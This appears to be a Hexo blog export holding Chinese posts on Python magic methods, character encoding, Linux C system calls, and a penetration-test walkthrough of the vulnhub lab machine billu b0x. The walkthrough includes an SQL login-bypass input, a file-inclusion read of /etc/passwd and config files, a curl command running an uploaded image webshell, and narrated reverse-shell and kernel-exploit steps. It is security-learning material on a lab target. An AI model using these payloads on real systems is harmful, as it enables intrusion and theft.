模块、类、函数通过调用dir函数，可以得到该对象实际可以使用的所有属性。 关于_xx __xx __xx__ _xx: Python中没有真正的私有属性或方法,可以在你想声明为私有的方法和属性前加上单下划线,以提示该属性和方法不应在外部调用.如果真的调用了也不会出错,但不符合规范。所以真的私有属性可以通过闭包来实现。 __xx: 双下划线开头,是为了不让子类重写该属性方法.通过类的实例化时自动转换.在类中的双下划线开头的属性方法前加上”_类名”实现： 12345678910class A(object): def __init__(self, x): self.a=x def __b(self): self.x=3a = A(2)a._A__b()print(a.x,a.x) __xx__: 此种写法为Python内建属性方法，最好不要在外部调用 python魔术方法我们平时用得比较多的是python的__init__(),__del__()分别对应于类的实例化和实例销毁，但是，除了这些方法以外仍旧有很多的类所拥有的魔术方法，一下是我在网上的一个blog中发现的，总结得比较全面，所以摘录如下，方便日后查阅和理解python的一些比较绕的命令执行。 魔术方法含义 基本的魔术方法__new__(cls[, …]) 1. __new__ 是在一个对象实例化的时候所调用的第一个方法 2. 它的第一个参数是这个类，其他的参数是用来直接传递给 __init__ 方法 3. __new__ 决定是否要使用该 __init__ 方法，因为 __new__ 可以调用其他类的构造方法或者直接返回别的实例对象来作为本类的实例，如果 __new__ 没有返回实例对象，则 __init__ 不会被调用 4. __new__ 主要是用于继承一个不可变的类型比如一个 tuple 或者 string __init__(self[, …]) 构造器，当一个实例被创建的时候调用的初始化方法 __del__(self) 析构器，当一个实例被销毁的时候调用的方法 __call__(self[, args…]) 允许一个类的实例像函数一样被调用：x(a, b) 调用 x.__call__(a, b) __len__(self) 定义当被 len() 调用时的行为__repr__(self) 定义当被 repr() 调用时的行为，__repr__用于所有其他的环境中：用于交互模式下提示回应以及repr函数，如果没有使用__str__，会使用print和str。它通常应该返回一个编码字符串，可以用来重新创建对象，或者给开发者详细的显示。 __str__(self) 定义当被 str() 调用时的行为，打印操作会首先尝试__str__和str内置函数(print运行的内部等价形式)，它通常应该返回一个友好的显示。 __bytes__(self) 定义当被 bytes() 调用时的行为 __hash__(self) 定义当被 hash() 调用时的行为 __bool__(self) 定义当被 bool() 调用时的行为，应该返回 True 或 False__format__(self, format_spec) 定义当被 format() 调用时的行为 有关属性 __getattr__(self, name) 定义当用户试图获取一个不存在的属性时的行为 __getattribute__(self, name) 定义当该类的属性被访问时的行为 __setattr__(self, name, value) 定义当一个属性被设置时的行为 __delattr__(self, name) 定义当一个属性被删除时的行为 __dir__(self) 定义当 dir() 被调用时的行为 __get__(self, instance, owner) 定义当描述符的值被取得时的行为 __set__(self, instance, value) 定义当描述符的值被改变时的行为 __delete__(self, instance) 定义当描述符的值被删除时的行为 比较操作符 __lt__(self, other) 定义小于号的行为：x &lt; y 调用 x.__lt__(y) __le__(self, other) 定义小于等于号的行为：x &lt;= y 调用 x.__le__(y) __eq__(self, other) 定义等于号的行为：x == y 调用 x.__eq__(y) __ne__(self, other) 定义不等号的行为：x != y 调用 x.__ne__(y) __gt__(self, other) 定义大于号的行为：x &gt; y 调用 x.__gt__(y) __ge__(self, other) 定义大于等于号的行为：x &gt;= y 调用 x.__ge__(y) 算数运算符 __add__(self, other) 定义加法的行为：+ __sub__(self, other)定义减法的行为：- __mul__(self, other) 定义乘法的行为：* __truediv__(self, other) 定义真除法的行为：/ __floordiv__(self, other) 定义整数除法的行为：// __mod__(self, other) 定义取模算法的行为：% __divmod__(self, other) 定义当被 divmod() 调用时的行为 __pow__(self, other[, modulo]) 定义当被 power() 调用或 ** 运算时的行为 __lshift__(self, other) 定义按位左移位的行为：&lt;&lt; __rshift__(self, other)定义按位右移位的行为：&gt;&gt; __and__(self, other) 定义按位与操作的行为：&amp; __xor__(self, other) 定义按位异或操作的行为：^ __or__(self, other)定义按位或操作的行为：| 反运算 __radd__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rsub__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rmul__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rtruediv__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rfloordiv__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rmod__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rdivmod__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rpow__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rlshift__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rrshift__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rand__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rxor__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __ror__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） 增量赋值运算 __iadd__(self, other) 定义赋值加法的行为：+= __isub__(self, other) 定义赋值减法的行为：-= __imul__(self, other) 定义赋值乘法的行为：*= __itruediv__(self, other) 定义赋值真除法的行为：/= __ifloordiv__(self, other) 定义赋值整数除法的行为：//= __imod__(self, other) 定义赋值取模算法的行为：%= __ipow__(self, other[, modulo]) 定义赋值幂运算的行为：**= __ilshift__(self, other) 定义赋值按位左移位的行为：&lt;&lt;= __irshift__(self, other) 定义赋值按位右移位的行为：&gt;&gt;= __iand__(self, other) 定义赋值按位与操作的行为：&amp;= __ixor__(self, other) 定义赋值按位异或操作的行为：^= __ior__(self, other) 定义赋值按位或操作的行为：|= 一元操作符 __pos__(self) 定义正号的行为：+x __neg__(self) 定义负号的行为：-x __abs__(self) 定义当被 abs() 调用时的行为 __invert__(self) 定义按位求反的行为：~x 类型转换 __complex__(self) 定义当被 complex() 调用时的行为（需要返回恰当的值） __int__(self) 定义当被 int() 调用时的行为（需要返回恰当的值） __float__(self) 定义当被 float() 调用时的行为（需要返回恰当的值） __round__(self[, n]) 定义当被 round() 调用时的行为（需要返回恰当的值） __index__(self) 1. 当对象是被应用在切片表达式中时，实现整形强制转换 2. 如果你定义了一个可能在切片时用到的定制的数值型,你应该定义 __index__ 3. 如果 __index__ 被定义，则 __int__ 也需要被定义，且返回相同的值 上下文管理（with 语句） __enter__(self) 1. 定义当使用 with 语句时的初始化行为 2. __enter__ 的返回值被 with 语句的目标或者 as 后的名字绑定 __exit__(self, exc_type, exc_value, traceback) 1. 定义当一个代码块被执行或者终止后上下文管理器应该做什么 2. 一般被用来处理异常，清除工作或者做一些代码块执行完毕之后的日常工作 容器类型 __len__(self) 定义当被 len() 调用时的行为（返回容器中元素的个数） __getitem__(self, key) 定义获取容器中指定元素的行为，相当于 self[key] __setitem__(self, key, value) 定义设置容器中指定元素的行为，相当于 self[key] = value __delitem__(self, key) 定义删除容器中指定元素的行为，相当于 del self[key] __iter__(self) 定义当迭代容器中的元素的行为 __reversed__(self) 定义当被 reversed() 调用时的行为 __contains__(self, item) 定义当使用成员测试运算符（in 或 not in）时的行为 参考文献： 1. Python魔术方法总结2. Python 魔术方法3. Python 面向对象4. 关于Python sec的一些简单的总结5 python沙盒绕过6. Python魔法方法指南7. Python Pickle的任意代码执行漏洞实践和Payload构造]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>绕过</tag>
        <tag>python</tag>
        <tag>魔术方法</tag>
        <tag>类属性</tag>
        <tag>沙箱逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编码]]></title>
    <url>%2F2018%2F07%2F26%2F%E7%BC%96%E7%A0%81%2F</url>
    <content type="text"><![CDATA[是时候好好总结一番计算机字符编码的知识，很多安全问题都离不开编码这一基础知识，现在把编码有关的知识整理如下： 计算机的编码方式有许多种，编码指的就是将人日常中经常使用的字符与计算机能够识别的二进制做一一映射的函数转换，而这个函数转换就是我们所说的编码。全世界各个国家的地域文明不同，产生的符号文化符号也不尽相同，常见的有阿拉伯数字，英文字母，汉字，希伯来文，叙利亚文等等，还有一些符号标识，如我们常说的逗号和冒号之类的标点。由此可见，要使得所有这些编码有个统一的映射，需要的字节数从1~6字节不等。这也就是为啥不同的编码标准方式会有不同不同的“编码域”。随着时代的发展，我们的编码标准也在不断发展着，所以发展到现在，产生了新旧很多不同的编码标准和规范。这就是为什么现在的编程语言，文本显示器等与文字打交道的人类发明都不可避免的与编码打交道。很多乱码的产生，如windows终端和linux终端编码方式的不同，从不同编码的应用中获取到的编码方式不统一的字符，就会导致乱码。一个十分常见的例子就是python中去获取web站点的html信息时，因为编码不同导致乱码的产生。除了乱码，很多的安全问题的产生，也是由于编码问题处理不严谨导致绕过。sql宽字节注入，各种编码绕过waf等。 ASCII一种7位编码方式，这是一种最质朴，128个字符完全可以把英语的所有字符一一映射，不得不说英语的确很简洁。同时ASCII并且几乎都被后来者兼容的一种7位编码方式，没错，就是我们初学c语言的时候，附录都会存在的一种编码。 latin1（latin-1,ISO-8859-1）是一种八位容量（一字节）的编码方式，向下兼容ASCII。mysql里面的默认编码方式就是latin1（一字节的编码方式是不包含汉字的，这也是为什么mysql默认不支持中文的原因 ） unicode既然世界范围不同的文化背景有不同的标识符，那么一个统一包含有世界上所有符号的对应关系的标准的推出就显得十分必要。unicode正是充当了这一种角色。Unicode（中文：万国码、国际码、统一码、单一码）是计算机科学领域里的一项业界标准。它对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。 摘录自wiki百科 unicode编码的方式做到了向下兼容latin1。想想看为什么要兼容？直观的看就是支持latin1编码的文件在把编码方式改变为unicode的时候不会出现乱码。这样就很好的做到了承前启后，这是计算机领域一条基本准则（python 除外）。 另外: 需要注意的是，unicode只是一种不考虑实际存储效益和实现细节的“纸上谈兵”的规范，因为不同于其他的编码方式，unicode是个很大很大的字符集和，如果全采取一一影射的关系，势必会造成空间的极大浪费，假如每个字符都采用六个字节的传输方式，想想看的确是十分占用空间。它就好比它是一个纸面上的规则，具体的实现细节则又会衍生出一些unicode实现编码方式 utf-8UTF-8就是在互联网上使用最广的一种unicode的实现方式。其他实现方式还包括UTF-16和UTF-32,注意UTF-16中由于每个字符占用两个字节，所以MAC类电脑基于低位字节开始读取的，其他电脑基于高位读取，从而会造成编码顺序不一致的错误，所以在使用UTF-16的时候需要指定是大端程序（Big-Endian）或者小端程序（Little-Endian）,，默认情况下UTF-16 LE. 1234561字节 0xxxxxxx 2字节 110xxxxx 10xxxxxx 3字节 1110xxxx 10xxxxxx 10xxxxxx 4字节 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 5字节 111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 6字节 1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 12345678910111213符号范围 | UTF-8编码方式(十六进制) | （二进制）--------------------+---------------------------------------------0000 0000-0000 007F | 0xxxxxxx0000 0080-0000 07FF | 110xxxxx 10xxxxxx0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx GB系列这个系列里面有很多的标准，从发布的时间从前往后有：GB 2312–80，GB 13000.1-93，GB 18030-2000，GB 18030-2005，GB 13000-2010，除此之外，还有一个GBK规范，注意GBK不是国家标准，但是却被广泛使用，并且被前述GB13000和GB18030所继承，同时GBK向前继承了GB 2312–80。另外还需要注意的是GBK类编码与unicode的编码实现方案utf-8，utf-16系列完全不兼容。同样类似的使用双字节编码的还有汉字的台湾标准big5。 base64/base32这是一种使用64/32位字符来对二进制的流进行重新编码的方式，在日常生活中也是用得比较多。]]></content>
      <categories>
        <category>字符编码</category>
      </categories>
      <tags>
        <tag>字符编码</tag>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vulnbox]]></title>
    <url>%2F2018%2F07%2F21%2Fvulnbox%2F</url>
    <content type="text"><![CDATA[一篇渗透学习实战记录，靶机来源于vulnhub的billu b0x。最近打算找找靶机练手，所以这是对自己在vulnhub渗透学习之路的记录，打算写上一系列，这是第一篇。 实验环境： 平台: windows10 64位 VMware workstation(12.1.1 build-3770994) 网络环境：vmware里面的虚拟网卡实现一下主机的桥连，并且kali还有一张虚拟网卡实现Net连接（也就是共享主机网络模式）。二者的桥连网络地址如下： 攻击机kali（192.168.70.129） 靶机linux（192.168.70.128） 在对环境部署好后，摩拳擦掌，跃跃欲试！ 渗透过程先在下载地址看下靶机的基本信息，如下： 信息给得中规中矩，给出了服务器大致的框架PHP，Apache，MySQL(其实这些在实际的渗透中我们是不知道的，这里算是给了类似于半白盒的渗透方式了) 1.信息搜集靶机上线后，就是我们的渗透过程开启了。啥也不说，光是提示给的信息，我们对这台靶机的了解还是太少，第一步当然是信息收集，啥也不说，namp走一波！看到靶机开启了两个服务器正常开启的端口80和22。接着换参数扫一下靶机的操作系统。得到信息linux内核版本为3.2-4.9，这个信息返回的效果虽然不太确切，但是好歹我们知道内核版本相对比较新。如果这一步我们能够得到比较确切的版本信息，就可以比较有针对性的在后面提权中游刃有余。 大致了解了一下信息后，我们自然想到的是去访问一下网站主页，看看这是个何方神圣。 可以说这个网站也是很hacker了，这是一个比较中规中矩的post类型的sql注入框，作者都十分挑衅的说到了（show me your sqli skills）,好吧，是可忍孰不可忍，常规sql注入走一波，发现这里一般性的方法都不怎么有效。放了sqlmap跑了一没有什么效果。然后随便试了试robots.txt，也没有发现什么有价值的东西。好吧，作者你赢了！ 在困境中的这个时候怎么能够不爆破一下目录呢？drib类似与window下的御剑之类神器，基于字典的网站目录爆破。熟练的敲下drib 192.168.70.128 [big.txt] Common.txt爆破的结果 big.txt 爆破的结果 有趣，一下出来这么多目录列表。这个时候当然只能够一个一个的去打开看看。这个时候莫名想起一首歌，如果你愿意一层一层的拨开……，额，走题了，其中的images目录里面是三张图，里面是勒比海盗jack和船长（估计作者在帮打广告）当然这都不重要，不是我们想要的。一一打开了这些文件，发现三个地方有点意思的： 2.脆弱挖掘打开http://192.168.70.128/phpmy/main 很好，一个mysql的管理登陆界面，fuzz了一些常用的弱密码，发现无法获得登陆权限，暂且放一放。 打开http://192.168.70.128/add，我们发现了一个图片上传界面 当我们打开到test目录的时候发现，这个网页奇迹般的回显一个错误： 3. 漏洞利用这意味这啥？赤裸裸的挑衅，明摆着的文件包含漏洞？作者心也太大了吧，好，既然如此，/etc/passwd fuzz一波，刚开始使用的是get方法，仍旧回显错误，接着post提交了一下： 直接给我们返回了靶机的/etc/passwd文件内容，这说明这就是个如假包换的文件包含漏洞，到此我们找到了一个突破口，可以读取任意文件内容。好，这个时候需要静下来想想怎么利用这个漏洞。基于这个漏洞，会有个条件反射的思考，那就是读取网站的源码或者读取一些配置文件的信息。基于前面的phpmyadmin界面，我们知道mysql是通过它来管理，那么不如读一下phpmyadmin的配置文件 很好，不负所望的返回了用户名和密码，拿去登陆一下phpmyadmin，发现竟然登不进去，但是按照道理这地方应该就是登陆phpmyadmin的账户名和密码，难不成作者在此是为了降低难度，直接给了个ssh的密码？ 果然这样我们就直接以root权限登陆进来。看下root目录和/目录下的文件： Ok,我们的渗透当然到此是完成了预期的，以root权限的登陆的目的。 4.另一条路但是这或许是一种比较初级的解法，在实际的渗透过程中不太常见，当然不排除系统root用户与数据库root用户是同一个人，并且设置的密码都是一样的。这就比较幸运了。所以为了考虑实际的渗透场景，我假设自己没有知道root密码的情况下，尝试去反弹shell以及逐渐获得root权限的过程。 为了找到一些有用的信息，我们只能一步一步的从最开始的文件包含漏洞开始，争取把web的源码审计一番，看看还有没有一点可以利用的地方。这个时候想到的是那个文件上传界面，我们通过test.php的文件包含可以看到上传界面的相关源码，我们发现panel.php存在如下的代码，可以认为是对上传的文件的一个验证： 从这段代码中，我们知道对于上传上去的图片必须是以jpeg,jpg,gif,png后缀的文杰，并且后台还会检查FILEINFO_MIME属性，根据经验，绕过FIFEINFO_MIME属性检测可以直接使用构造的文件格式头，再加上我们的一句话木马即可，关键是找到可以执行我们上传的的伪图片的利用点，同样的在这个文件中，我们看到如下代码段： 发现include(),很好这样我们的木马就可以被执行了。 但是问题是我们得有上传的界面，这让我想起了之前扫出来的目录add.php，但是这个从这个目录是不能够正确上传成功的。看了一下源码，发现后台并没有处理这个表单的脚本，所以可能这不是我们最终的上传界面，我们上传界面在其他地方。这个时候，再一次通过test.php的界面，打开登陆界面的源码来看，如下： 这里只是对输入单引号进行了过滤，但是通过观察思考它的查询结构以及pass语句在uname之前，所以，我们可以很容易想到一个绕过的语句： 12Pass: \Username: or 1=1# 这样我们就可以成功进入，然后新建一个用户，上传一个有木马的图片。登陆后的界面如下： 5.构造绕过FILEINFO_MIME的webshell 看到我们的小马已经准备就绪，新建一个用户直接把用户头像传入就ok啦。 接着我们就需要用到之前的penal.php部分的代码来对我们上传的文件进行利用： 12curl -X POST --data &quot;load=../../../var/www/uploaded_images/shell.gif&amp;continue=continue&quot; http://192.168.70.128/panel.php?cmd=whoami--cookie &quot;PHPSESSID=r0niu6jk5scmc3au2klbqipc12&quot; 上面是我的执行代码，其中的cookie值是之前sql注入进入的penal.php的cookie值，结果返回如下： 图中我们可以看到自己成果执行了poc中的whoami指令，返回的结果正是我们现在获得权限的用户名，www-data。很好，这个时候其实就已经可以菜刀连接然后执行命令了。 为了体验正真的反弹shell,我打算自己用nc去实现一次回弹shell的操作。 6.回弹shell和权限提升利用nc和python的simpleHTTPServer来进行一次别开生面的shell回弹。 攻击机新建一个文件夹，并且把nc命令copy到这个文件夹，执行python的simpleHTTPServer，让其运行在80端口方便后面靶机通过wget下载。 靶机调用我们之前传的木马，去远程下载这个共享的nc文件，然后进行shell的端口绑定，执行如下： 然后shell端口绑定，这个地方有个坑，就是nc命令copy过去的时候在靶机是没有执行权限的，然后着实纠结了一下。（可以看到下面的文件只有读的权限） 这个时候就有点尴尬，后来兜兜转转想到可以使用msf来生成shell进行回弹，这样也比较方便。就试了一下，生成伪造图片shell1.gif： 然后注册新用户上传,在本机打开msf控制台 执行文件包含漏洞的命令： 然后可以看到我们的shell回弹成功了，然后执行sysinfo，查看当前内核版本。还记得我们开始的时候有说过，uname -a 查看的内核版本是可以方便后面的提权，这里就很好的体现了出来，那么得出了系统的内核版本后，就可以去针对性的搜索一些可用的提权方案，这里找到了网上exploit_db的一个针对该版本的内核漏洞。通过下载c文件，gcc编译后，我们就可以以root用户权限了。 反思总的来说这是一个愉快的渗透体验，当然这个过程也参考了前辈的经验。整个流程做下来还是比较舒服，渗透思路还是相当的清晰的。anyhow 也算是走了一遍流程。当然渗透是个博大精深的学问，这个实验只是包括了大致的信息搜集漏洞扫描到webshell和提权的过程，囊括了一些渗透的细节，不过在内网穿透和域的横向渗透上的能力还没有很好的模拟出环境，这题是默认我们已经和靶机在同一个局域网，还是有一点偏离实际，以后要自己搭搭内网渗透的实验环境来学习，ok,鸣金收兵！]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>web</tag>
        <tag>渗透</tag>
        <tag>提权</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux C API 笔记]]></title>
    <url>%2F2018%2F06%2F25%2Flinux-C-API-%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[linuxc编程的应用范围比较广，最近学习操作系统，把上机和可编程中用到的一些函数API做一些笔记和摘录，方便日后复习。上机的相关代码在:https://github.com/IversionBY/linux_systemlearning_c_programe/ 温故而知新 关于c语言指针的文章，写得很不错 C语言各个数据类型占用的地址位123456789101112131415char：1字节int：2字节short int：2字节long int：4字节unsigned: 2字节unsigned long：4字节float：4字节double：8字节 函数API basename()实现对文件名的获取 12345 #include &lt;libgen.h&gt; char *basename(char *path);//参数是文件的路径//返回值是一个字符串类型，即文件名 stat() lstat() fstat()返回一个文件的基本信息，包括文件的大小，文件类型等，操作系统上机题目中用到的是目录的判定，最常用的结构体成员是st_mode。与其相类似的是lstat(),fstat()功能和stat()差不多。fstat区别于另外两个系统调用的地方在于，fstat系统调用接受的是一个“文件描述符”（进程通过open系统调用返回的文件描述符，int类型。），而另外两个则直接接受“文件全路径”。stat和lstat的区别：当文件是一个符号链接时，lstat返回的是该符号链接本身的信息；而stat返回的是该链接指向的文件的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;unistd.h&gt;int stat(const char * file_name, struct stat *buf);int fstat(int filedes, struct stat *buf); int lstat(const char *path, struct stat *buf); /*参数解释path：文件路径名。 filedes：文件描述词。 buf：保存文件信息的结构体 *///执行成功则返回0，失败返回-1，错误代码存于errno/*错误代码ENOENT 参数file_name指定的文件不存在ENOTDIR 路径中的目录存在但却非真正的目ELOOP 欲打开的文件有过多符号连接问题，上限为16符号连接 EFAULT 参数buf为无效指针，指向无法存在的内存空间EACCESS 存取文件时被拒绝ENOMEM 核心内存不足ENAMETOOLONG 参数file_name的路径名称太长数值*//*结构体定义struct stat&#123; dev_t st_dev; //device 文件的设备编号 ino_t st_ino; //inode 文件的i-node mode_t st_mode; //protection 文件的类型和存取的权限 nlink_t st_nlink; //number of hard links 连到该文件的硬连接数目, 刚建立的文件值为1. uid_t st_uid; //user ID of owner 文件所有者的用户识别码 gid_t st_gid; //group ID of owner 文件所有者的组识别码 dev_t st_rdev; //device type 若此文件为装置设备文件, 则为其设备编号 off_t st_size; //total size, in bytes 文件大小, 以字节计算 unsigned long st_blksize; //blocksize for filesystem I/O 文件系统的I/O 缓冲区大小. unsigned long st_blocks; //number of blocks allocated 占用文件区块的个数, 每一区块大小为512 个字节. time_t st_atime; //time of lastaccess 文件最近一次被存取或被执行的时间, 一般只有在用mknod、utime、read、write 与tructate 时改变. time_t st_mtime; //time of last modification 文件最后一次被修改的时间, 一般只有在用mknod、utime 和write 时才会改变 time_t st_ctime; //time of last change i-node 最近一次被更改的时间, 此参数会在文件所有者、组、权限被更改时更新&#125;;*//*st_mode的类型标识S_IFMT 0170000 文件类型的位遮罩 S_IFSOCK 0140000 scoket S_IFLNK 0120000 符号连接 S_IFREG 0100000 一般文件 S_IFBLK 0060000 区块装置 S_IFDIR 0040000 目录 S_IFCHR 0020000 字符装置 S_IFIFO 0010000 先进先出 S_ISUID 04000 文件的(set user-id on execution)位 S_ISGID 02000 文件的(set group-id on execution)位 S_ISVTX 01000 文件的sticky位 S_IRUSR(S_IREAD) 00400 文件所有者具可读取权限 S_IWUSR(S_IWRITE)00200 文件所有者具可写入权限 S_IXUSR(S_IEXEC) 00100 文件所有者具可执行权限 S_IRGRP 00040 用户组具可读取权限 S_IWGRP 00020 用户组具可写入权限 S_IXGRP 00010 用户组具可执行权限 S_IROTH 00004 其他用户具可读取权限 S_IWOTH 00002 其他用户具可写入权限 S_IXOTH 00001 其他用户具可执行权限 *//*linux中检查上述st_mode成员类型的宏定义函数S_ISLNK(st_mode) 判断是否为符号连接 S_ISREG(st_mode) 是否为一般文件 S_ISDIR(st_mode) 是否为目录 S_ISCHR(st_mode) 是否为字符三设备文件 S_ISBLK(st_mode) 是否为先进先出 S_ISSOCK(st_mode) 是否为socket S_ISUID(st_mode) 文件设置了SUID位S_ISGID(st_mode) 文件设置了SGID位S_ISVTX(st_mode) 文件设置了sticky位*/ open()打开一个文件，可以指定打开的flag和权限 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt;int open(const char * pathname, int flags, mode_t mode);/*参数解释pathname:需要打开的文件路径flags:打开的标志位mode:打开的权限方式*///返回值：正确返回打开的文件句柄，打开失败返回-1，注意返回的句柄默认从整数3开始。其中标识符`0，1，2`分别被`标准输入`，`标准输出`，`标准错误输出`占用。/*flagsO_RDONLY 以只读方式打开文件O_WRONLY 以只写方式打开文件O_RDWR 以可读写方式打开文件. 上述三种旗标是互斥的, 也就是不可同时使用, 但可与下列的旗标利用OR(|)运算符组合.O_CREAT 若欲打开的文件不存在则自动建立该文件.O_EXCL 如果O_CREAT 也被设置, 此指令会去检查文件是否存在. 文件若不存在则建立该文件, 否则将导致打开文件错误. 此外, 若O_CREAT 与O_EXCL 同时设置, 并且欲打开的文件为符号连接, 则会打开文件失败.O_NOCTTY 如果欲打开的文件为终端机设备时, 则不会将该终端机当成进程控制终端机.O_TRUNC 若文件存在并且以可写的方式打开时, 此旗标会令文件长度清为0, 而原来存于该文件的资料也会消失.O_APPEND 当读写文件时会从文件尾开始移动, 也就是所写入的数据会以附加的方式加入到文件后面.O_NONBLOCK 以不可阻断的方式打开文件, 也就是无论有无数据读取或等待, 都会立即返回进程之中.O_NDELAY 同O_NONBLOCK.O_SYNC 以同步的方式打开文件.O_NOFOLLOW 如果参数pathname 所指的文件为一符号连接, 则会令打开文件失败.O_DIRECTORY 如果参数pathname 所指的文件并非为一目录, 则会令打开文件失败*//*modeS_IRWXU00700 权限, 代表该文件所有者具有可读、可写及可执行的权限.S_IRUSR 或S_IREAD, 00400 权限, 代表该文件所有者具有可读取的权限.S_IWUSR 或S_IWRITE, 00200 权限, 代表该文件所有者具有可写入的权限.S_IXUSR 或S_IEXEC, 00100 权限, 代表该文件所有者具有可执行的权限.S_IRWXG 00070 权限, 代表该文件用户组具有可读、可写及可执行的权限.S_IRGRP 00040 权限, 代表该文件用户组具有可读的权限.S_IWGRP 00020 权限, 代表该文件用户组具有可写入的权限.S_IXGRP 00010 权限, 代表该文件用户组具有可执行的权限.S_IRWXO 00007 权限, 代表其他用户具有可读、可写及可执行的权限.S_IROTH 00004 权限, 代表其他用户具有可读的权限S_IWOTH 00002 权限, 代表其他用户具有可写入的权限.S_IXOTH 00001 权限, 代表其他用户具有可执行的权限.*/ access()检查调用进程是否可以对指定的文件执行某种操作，也可以判断一个文件是否存在。 1234567891011121314151617181920212223242526#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;int access(const char *pathname, int mode);/*参数pathname: 需要测试的文件路径名。 mode: 需要测试的操作模式*///返回：成功执行时，返回0。失败返回-1。/*error 类型成功执行时，返回0。失败返回-1，errno被设为以下的某个值 EINVAL： 模式值无效 EACCES： 文件或路径名中包含的目录不可访问 ELOOP ： 解释路径名过程中存在太多的符号连接 ENAMETOOLONG：路径名太长 ENOENT： 路径名中的目录不存在或是无效的符号连接 ENOTDIR： 路径名中当作目录的组件并非目录 EROFS： 文件系统只读 EFAULT： 路径名指向可访问的空间外 EIO： 输入输出错误 ENOMEM： 不能获取足够的内核内存 ETXTBSY：对程序写入出错*/ close()12345678#include &lt;unistd.h&gt;int close(int fd);/*参数fd:open函数返回的文件描述符*///返回值：若文件顺利关闭则返回0, 发生错误时返回-1.//错误代码：EBADF 参数fd 非有效的文件描述词或该文件已关闭. perror()可以打印出最近一次异常信息，如果提供了指定的字符串，就可以在指定的字符串后面输出异常信息。 12#include &lt;stdio.h&gt;void perror(char *string); read()read函数从指定的打开的文件fd中读取指定大小count的字节到从buf开始的缓冲，缓冲区可以是用户自定义的一个数据形式。 123456789101112131415#include &lt;unistd.h&gt;ssize_t read(int fd, void * buf, size_t count);/*参数说明fd:文件描述符buf:定义的缓冲区count: 需要读取的字节*///返回值:若读取失败则返回-1.读取成功则返回实际读取到的字节数./*错误代码EINTR 此调用被信号所中断.EAGAIN 当使用不可阻断I/O 时(O_NONBLOCK), 若无数据可读取则返回此值.EBADF 参数fd 非有效的文件描述词, 或该文件已关闭.*/ write()把参数buf 所指的内存写入count 个字节到参数fd所指的文件内。当然,文件读写位置也会随之移动。这个函数和上个函数有一点是需要注意的就是缓冲区的大小可能比文件的内容大小要小，这个时候会有一个特征值-1返回给程序员。 123456789#include &lt;unistd.h&gt;ssize_t write (int fd, const void * buf, size_t count);/*参数fd:文件描述符buf:缓冲区count:需要写入的字节数//返回值：成功的话就会返回写入字节大小，数组溢出返回-1. getcwd()获取当前目录名 1234567#include &lt;unistd.h&gt;char * getcwd(char * buf, size_t size);/*参数定义：buf：为一个缓存数组size：为数组的大小*/ getpwuid() 1234#include &lt;pwd.h&gt; #include &lt;sys/types.h&gt;定义函数：struct passwd * getpwuid(uid_t uid); getuid() 用来取得执行目前进程的用户识别码.没有返回值来指示错误。1234#include &lt;unistd.h&gt; #include &lt;sys/types.h&gt;uid_t getuid(void); uname()返回一个关于系统信息的结构体，非负表示调用成功，负数表示返回失败。 1234567891011121314#include&lt;sys/utsname.h&gt;int uname(struct utsname *name );struct utsname&#123; char sysname[]; char nodename[]; char release[]; char version[]; char machine[]; #ifdef _GNU_SOURCE char domainname[]; #endif&#125;; dup()与dup2()复制一个现存的文件描述符。其中标识符0，1，2分别被标准输入，标准输出，标准错误输出占用dup()用来复制参数oldfd 所指的文件描述词, 并将它返回. 此新的文件描述词和参数oldfd 指的是同一个文件, 共享所有的锁定、读写位置和各项权限或旗标. 例如, 当利用lseek()对某个文件描述词作用时, 另一个文件描述词的读写位置也会随着改变。dup2只是多指定了newfd而已，程序员可以直接将oldfd文件符copy到一个自定义的文件符上，若参数newfd为一已打开的文件描述词, 则newfd 所指的文件会先被关闭. dup2()所复制的文件描述词。 12345#include &lt;unistd.h&gt;int dup(int oldfd);//返回值：当复制成功时, 则返回最小及尚未使用的文件描述词. 若有错误则返回-1, errno 会存放错误代码.int dup2(int oldfd, int newfd);//返回值：当复制成功时, 则返回newfd文件描述词. 若有错误则返回-1, errno 会存放错误代码. strtok()用于对字符串进行拆分 1234567891011121314151617181920212223242526272829#include &lt;string.h&gt;char * strtok(char *s, const char *delim);/*例子#include &lt;string.h&gt;#include &lt;stdio.h&gt;int main()&#123; const char str[80] = "This is - www.w3cschool.cc - website"; const char s[2] = "-"; char *token; /* 获取第一个子字符串 */ token = strtok(str, s); /* 继续获取其他的子字符串 */ while( token != NULL ) &#123; printf( " %s\n", token ); token = strtok(NULL, s); &#125; return(0);&#125;*/ 